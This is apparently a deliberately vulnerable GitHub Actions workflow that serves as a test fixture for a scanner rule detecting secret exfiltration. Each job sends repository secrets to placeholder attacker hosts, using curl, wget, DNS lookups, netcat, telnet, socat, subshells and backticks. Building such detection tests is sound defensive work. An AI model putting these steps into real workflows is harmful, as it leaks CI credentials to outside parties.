# Vulnerable workflow demonstrating secret exfiltration patterns
# This workflow contains multiple examples of secrets being sent to external services
# All of these patterns should be detected by the secret-exfiltration rule

name: Secret Exfiltration Examples (Vulnerable)
on:
  push:
    branches: [main]
  workflow_dispatch:

jobs:
  curl-exfiltration:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      # BAD: Direct secret in curl POST data
      - name: curl with secret in POST data
        run: |
          curl -X POST https://attacker.com/collect \
            -d "token=${{ secrets.API_TOKEN }}"

      # BAD: Secret in curl header
      - name: curl with secret in header
        run: |
          curl -H "Authorization: Bearer ${{ secrets.AUTH_TOKEN }}" \
            https://evil.example.com/api

      # BAD: Secret in curl --data-raw flag
      - name: curl with --data-raw
        run: |
          curl --data-raw "key=${{ secrets.SECRET_KEY }}" \
            https://malicious.site/exfil

  wget-exfiltration:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      # BAD: Secret in wget --post-data
      - name: wget with secret
        run: |
          wget --post-data "credentials=${{ secrets.CREDENTIALS }}" \
            https://attacker.com/steal

      # BAD: Secret in wget header
      - name: wget with header secret
        run: |
          wget --header "X-API-Key: ${{ secrets.API_KEY }}" \
            https://evil.site/data

  dns-exfiltration:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      # BAD: DNS exfiltration using dig
      - name: dig exfiltration
        run: |
          dig ${{ secrets.TOKEN }}.attacker.com

      # BAD: DNS exfiltration using nslookup
      - name: nslookup exfiltration
        run: |
          nslookup ${{ secrets.SECRET }}.evil.com

      # BAD: DNS exfiltration using host
      - name: host command exfiltration
        run: |
          host ${{ secrets.API_KEY }}.malicious.com

  netcat-exfiltration:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      # BAD: Secret piped to netcat
      - name: nc exfiltration
        run: |
          echo "${{ secrets.PASSWORD }}" | nc attacker.com 443

      # BAD: Secret piped to telnet
      - name: telnet exfiltration
        run: |
          echo "${{ secrets.CREDENTIALS }}" | telnet evil.com 23

      # BAD: Secret piped to socat
      - name: socat exfiltration
        run: |
          echo "${{ secrets.TOKEN }}" | socat - TCP:attacker.com:8080

  env-var-leak:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      # BAD: Secret passed via env var to curl
      - name: env var leak via curl
        env:
          MY_SECRET: ${{ secrets.SENSITIVE_DATA }}
        run: |
          curl -X POST https://attacker.com/collect \
            -d "data=$MY_SECRET"

      # BAD: Secret passed via env var to wget
      - name: env var leak via wget
        env:
          API_TOKEN: ${{ secrets.API_TOKEN }}
        run: |
          wget --post-data "token=${API_TOKEN}" https://evil.com/steal

  hidden-exfiltration:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      # BAD: Secret in subshell
      - name: subshell exfiltration
        run: |
          result=$(curl -d "secret=${{ secrets.TOKEN }}" https://evil.com)

      # BAD: Secret after && operator
      - name: chained command exfiltration
        run: |
          echo "Starting" && curl -d "${{ secrets.KEY }}" https://attacker.com

      # BAD: Secret with backticks
      - name: backtick exfiltration
        run: |
          output=`curl -H "Auth: ${{ secrets.AUTH }}" https://evil.com`

  multiple-secrets:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      # BAD: Multiple secrets in single command
      - name: multiple secrets exfiltration
        run: |
          curl -X POST https://attacker.com/bulk \
            -d "token1=${{ secrets.TOKEN1 }}" \
            -d "token2=${{ secrets.TOKEN2 }}" \
            -H "X-Api-Key: ${{ secrets.API_KEY }}"
